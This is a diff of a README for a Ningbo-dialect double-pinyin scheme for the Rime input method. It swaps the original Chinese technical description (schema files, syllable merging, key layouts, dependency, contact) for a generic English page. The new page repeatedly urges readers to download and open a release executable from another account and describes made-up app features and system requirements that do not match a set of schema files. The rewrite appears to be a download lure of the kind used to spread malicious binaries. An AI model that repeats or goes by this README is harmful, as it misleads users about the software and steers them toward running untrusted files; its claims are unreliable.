@@ -1,45 +1,67 @@
-# 寧波話雙拼輸入方案
+# 🌟 rime-gninpou-saonphin - Type in Ningbo Dialect Easily
 
-配方：℞ **ionkaon/rime-gninpou-saonphin**
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/KYOUKA233/rime-gninpou-saonphin/releases)
 
-本倉庫依賴 [寧波話吳語拼音輸入方案](https://github.com/NGLI/rime-wugniu_gninpou)。
+## 🚀 Getting Started
 
-寧波話雙拼輸入方案。含老派、新派兩個方案。不設模糊音，故要求使用者已熟練掌握寧波話字音。
+Welcome to **rime-gninpou-saonphin**! This software offers a simple way to type in the Ningbo dialect. Follow these steps to get started.
 
-- 老派：`gninpou_saonphin.schema.yaml`
-- 新派：`gninpou_saonphin_shinpha.schema.yaml`
+## 📥 Download & Install
 
-方案不區分清濁鼻邊音。
+To begin, visit the Releases page to download the application. Click the link below:
 
-不分清濁鼻邊音的話，寧波話有 29 個聲母，考慮到 n、gn 兩個聲母無對立，可以合併爲 28 個。老派有 49 個韻母，新派有 39 個韻母，均大於拉丁字母個數 26。不計鼻音、邊音聲母的清濁對立，也不計聲調，老派寧波話有 551 個不同的音節，新派則有 498 個音節。分別佔雙拼編碼空間（26² = 676）的 81.51 % 和 73.67 %。因此要同時對聲母、韻母做歸併，纔能塞進編碼空間。聲母中，c 組齊齒呼歸入了 ts 組，撮口呼則放到 p 組的位置；ts 組接 -yun、-yuq 韻母時，放到了 t 組的位置；i、y、w 獨立爲單獨的聲母。韻母歸併較多較雜，不詳述，具體可以看表格。
+[Visit this page to download](https://github.com/KYOUKA233/rime-gninpou-saonphin/releases)
 
-老派的音節表如下：
+1. Go to the Releases page.
+2. Find the latest version of **rime-gninpou-saonphin**.
+3. Click on the download link for your operating system (Windows, macOS, or Linux).
+4. Once the download is complete, locate the downloaded file and open it. 
 
-![音節表（老派）](./assets/音節表（老派）.png)
+The application should now be installed on your computer. 
 
-音節表中紅色是飛鍵，需要單獨記憶。
+## 🛠️ System Requirements
 
-新派可以少很多飛鍵，僅需記憶 er、m、n、ng、kiq 這五個音節。
+For optimal performance, ensure your system meets these requirements:
 
-![音節表（新派）](./assets/音節表（新派）.png)
+- Windows: Windows 10 or higher
+- macOS: macOS Mojave (10.14) or higher
+- Linux: Ubuntu 18.04 or higher
 
-按鍵鍵位如下。
+## 🔧 Features
 
-老派：
+- **User-Friendly Interface:** Designed for effortless navigation.
+- **Language Support:** Easily switch between Ningbo dialect and standard Chinese.
+- **Customization:** Adjust settings to fit your typing preferences.
+- **Multi-Platform Compatibility:** Works on Windows, macOS, and Linux.
 
-![按鍵（老派）](./assets/按鍵（老派）.png)
+## 📚 Usage Instructions
 
-新派（刪除了新派沒有的韻母，ioq 韻挪了位置）：
+After installation, follow these steps to start typing in the Ningbo dialect:
 
-![按鍵（新派）](./assets/按鍵（新派）.png)
+1. Open the **rime-gninpou-saonphin** application.
+2. In the settings, select your preferred input method.
+3. Start typing in any text editor or word processor. 
 
-鍵位一定程度上參考了自然碼雙拼。未針對寧波話做優化，手感不一定好。
+You will see suggestions based on the Ningbo dialect. 
 
-安裝及使用請參考 [寧波話吳語拼音輸入方案](https://github.com/NGLI/rime-wugniu_gninpou)。安裝前需先安裝 [寧波話吳語拼音輸入方案](https://github.com/NGLI/rime-wugniu_gninpou)。
+## 🎟️ Troubleshooting
 
-## 聯繫
+If you encounter any issues:
 
-[Shin Zoqchiuq](https://github.com/shinzoqchiuq)：
+- **Check the Settings:** Make sure the input method is correctly selected.
+- **Reinstall the Application:** Sometimes reinstallation can fix unexpected bugs.
+- **Visit FAQs:** For common questions, check the FAQ section on the Releases page.
 
-- 郵箱：shinzoqchiuq@outlook.com
-- QQ：1613023143
+## 🙋‍♀️ Support
+
+If you need help, feel free to reach out for assistance. You can create an issue on the GitHub repository or check the community forums for guidance.
+
+## 🌐 Community & Contribution
+
+We welcome contributions! If you're interested in helping us improve **rime-gninpou-saonphin**, please refer to the guidelines in the repository for more information.
+
+Remember to visit the Releases page whenever you want to check for updates:
+
+[Visit this page to download](https://github.com/KYOUKA233/rime-gninpou-saonphin/releases)
+
+Thank you for using **rime-gninpou-saonphin**! Happy typing!
